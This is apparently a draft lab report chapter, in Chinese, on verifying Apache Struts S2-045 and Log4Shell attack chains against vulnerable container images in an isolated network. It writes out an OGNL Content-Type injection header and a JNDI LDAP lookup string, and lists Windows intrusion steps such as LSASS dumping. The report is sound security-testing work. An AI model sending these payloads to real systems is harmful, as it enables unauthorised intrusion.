# E2E-RESULTS — PoC / 攻擊鏈真實驗證章節（草稿，poc-eng）

> 本章僅涵蓋 Phase 3「真實行為驗證」。由 poc-eng 於隔離實驗網路內執行，測完環境已清除。
> 執行日期：2026-11-15。守門規則：每次部署真實漏洞映像前，自動確認實驗容器**連不到宿主機任何位址、也無外連**，否則中止且不部署。

## 分級定義
真實重現 ＝ 對真實漏洞映像觸發真實弱點碼徑並取得目標端可觀測痕跡；
教學替代 ＝ 以無害替身示意行為；部分 ＝ 僅前置/連通；未驗證 ＝ 未執行；無法重現/BLOCKED ＝ 無映像或無法安全重現。

## 隔離守門（前置條件，必過）
- 工具：`tests/e2e/phase3-real-poc/guard.py`（建立與產品相同的隔離網路：`internal` + `com.docker.network.bridge.gateway_mode_ipv4=isolated`，以無害非 root 探針由網路內實測）。
- 修復前（基準）：host 埠 22/4000/8000 可達 → `isolated:false` → 守門會中止 Phase 3。證據 `evidence/poc-eng/phase3-guard-current-state.json`。
- 修復後（infra a7fd8c6 併入 main）：`isolated:true`、`host_ports_reached:[]`、`internet_reached:[]`。證據 `evidence/poc-eng/phase3-guard-after-fix.json`。
- 兩個 runner 每次執行前都重跑此守門（`poc_common.preflight`→`guard.require_isolation`）。

## 鏈 A — Apache Struts S2-045 / CVE-2017-5638（對應 Equifax Struts Web RCE 入口）
- 目標映像：`vulhub/struts2:2.3.30`（catalogue `vuln-struts2-s2-045`），隔離網路內，攻擊由 attacker 容器發出。
- 指令（attacker→struts2:8080）：`Content-Type: %{#context['...HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data`
- 目標端可觀測痕跡：HTTP 回應標頭 `vulhub: 54289`（233×233，伺服器端 OGNL 被求值）。良性請求無此標頭。
- 判定：**真實重現**（S2-045 OGNL 執行能力，真實映像；僅用算術探針，無 payload／檔案／shell）。
- 證據：`evidence/poc-eng/phase3-struts-s2045-result.json`。
- 與情資對照：這是 Equifax 鏈的 Web-RCE 入口技術（Linux/Java）。產品/版本與 Equifax 事件不同，故在情境層仍屬 EXTERNAL_ENRICHMENT／替代；弱點類型（Struts OGNL RCE）為真實重現。

## 鏈 B — Log4Shell / CVE-2021-44228（對應 AA22-320A 的 Log4Shell 步驟 B2）
- 目標映像：`vulhub/solr:8.11.0`（真實 Log4j 2.14.1，catalogue `vuln-log4shell-solr`），隔離網路內；回呼落在網路內 detection-only listener。
- 指令（attacker→solr:8983）：`GET /solr/admin/cores?action=${jndi:ldap://listener:1389/sol}`
- 目標端可觀測痕跡：listener 記錄到**來自 Solr 容器（172.26.0.2）的 LDAP 連線**，首位元組 `30 0c 02 01 01 60 …`＝真實 LDAP BindRequest。listener 不回傳任何內容 → JNDI 查詢觸發但**無類別載入／無 RCE**。良性 `action=STATUS` 無回呼。
- 判定：**真實重現 B2**（真實 Log4j JNDI/LDAP 回呼）。
- 證據：`evidence/poc-eng/phase3-log4shell-solr-result.json`。

## AA22-320A 其餘步驟的分級（無映像／Windows 專屬）
依 cti-research `expected.md` 第 7 節：
- B1 真實 Horizon RCE：**無法重現/BLOCKED**（VMware Horizon 無公開可散佈映像）。B2 以上方 Solr 真實重現其 JNDI 回呼技術。
- B3 Defender 排除、B10 Mimikatz、B13 GUI 關閉 Defender、B17 LSASS 傾印：**BLOCKED/未驗證**（需 Windows VM；本輪未建）。
- B8/B12 RDP 橫向、B11/B15 AD 操作：**BLOCKED**（需 Windows/AD 或 Samba 替代，本輪未建）。

## 小結
- 兩條 Linux/Java Web 弱點（Struts OGNL RCE、Log4Shell JNDI 回呼）在隔離網路內以真實漏洞映像**真實重現**，且只用無害 proof-of-capability 觀測（算術標頭／detection-only 回呼），無武器化。
- 所有 Windows／商業軟體專屬步驟如實標 BLOCKED。
- 全程隔離守門把關，測完環境清除，無殘留容器／網路。
